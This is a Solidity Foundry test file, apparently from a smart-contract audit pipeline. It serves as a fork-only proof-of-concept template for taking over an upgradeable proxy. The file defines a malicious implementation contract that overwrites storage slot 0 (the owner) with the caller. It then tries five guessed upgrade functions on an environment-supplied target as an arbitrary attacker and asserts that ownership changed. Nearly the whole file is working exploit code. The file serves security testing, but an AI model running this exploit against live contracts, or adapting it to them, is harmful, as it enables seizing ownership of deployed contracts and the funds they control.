// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Storage collision via unguarded upgrade
/// @notice Detectors: storage-gap, unprotected-admin, delegatecall. The
///         proxy's upgrade path is unguarded (or _authorizeUpgrade is
///         unrestricted), so anyone can point the proxy at a malicious
///         implementation whose storage layout collides with the proxy's
///         -- overwriting owner / balances / paused from the new code.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt upgradeTo() to the target's
///      real upgrade entry (upgradeTo / upgradeToAndCall /
///      setImplementation).

contract AttackImpl {
    // Slot 0 in the PROXY's storage (owner in most proxies).
    function pwn() external {
        assembly {
            sstore(0, caller())
        }
    }

    function owner() external view returns (address o) {
        assembly {
            o := sload(0)
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The owner observable: a named getter when one exists, else the proxy's
    /// slot 0 — which is exactly what a collision targets. The reader is a guess
    /// too, and a single name reads as "not reproduced" when it is wrong.
    function _ownerOf(address who) internal view returns (bool found, address owner_) {
        (bool ok, bytes memory ret) = who.staticcall(abi.encodeWithSignature("owner()"));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
        (ok, ret) = who.staticcall(abi.encodeWithSignature("admin()"));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
        (ok, ret) = who.staticcall(abi.encodeWithSignature("getOwner()"));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
        return (true, address(uint160(uint256(vm.load(who, bytes32(uint256(0)))))));
    }

    /// Point the proxy at the attacker's implementation, then run its code and
    /// see whether the owner observable moved. Success is that observable — the
    /// upgrade call returning proves nothing on its own.
    function _upgradeAndPwn(address attacker, string memory label, bytes memory upgradeData)
        internal
        returns (bool)
    {
        vm.prank(attacker);
        (bool upOk,) = target.call(upgradeData);
        console.log("tried", label, upOk ? "call returned" : "call reverted");
        if (!upOk) return false;
        vm.prank(attacker);
        (bool pwnOk,) = target.call(abi.encodeWithSignature("pwn()"));
        if (!pwnOk) return false;
        (bool found, address o) = _ownerOf(target);
        return found && o == attacker;
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        AttackImpl attackImpl = new AttackImpl();

        (, address ownerBefore) = _ownerOf(target);

        // The upgrade entry point is a GUESS on an unverified proxy.
        bool reproduced;
        if (!reproduced) {
            reproduced = _upgradeAndPwn(attackerEOA, "upgradeTo(address)", abi.encodeWithSignature("upgradeTo(address)", address(attackImpl)));
        }
        if (!reproduced) {
            reproduced = _upgradeAndPwn(attackerEOA, "setImplementation(address)", abi.encodeWithSignature("setImplementation(address)", address(attackImpl)));
        }
        if (!reproduced) {
            reproduced = _upgradeAndPwn(attackerEOA, "upgrade(address)", abi.encodeWithSignature("upgrade(address)", address(attackImpl)));
        }
        if (!reproduced) {
            reproduced = _upgradeAndPwn(attackerEOA, "setLogic(address)", abi.encodeWithSignature("setLogic(address)", address(attackImpl)));
        }
        if (!reproduced) {
            reproduced = _upgradeAndPwn(attackerEOA, "upgradeToAndCall(address,bytes)", abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(attackImpl), bytes("")));
        }

        (, address owner_) = _ownerOf(target);
        console.log("proxy owner before:", ownerBefore);
        console.log("proxy owner after:", owner_);
        assertTrue(
            reproduced,
            "no upgrade entry point let an arbitrary caller collide storage. Tried upgradeTo(address), setImplementation(address), upgrade(address), setLogic(address), upgradeToAndCall(address,bytes). This does NOT establish safety: the upgrade may be guarded, named differently, or take other arguments."
        );
    }
}
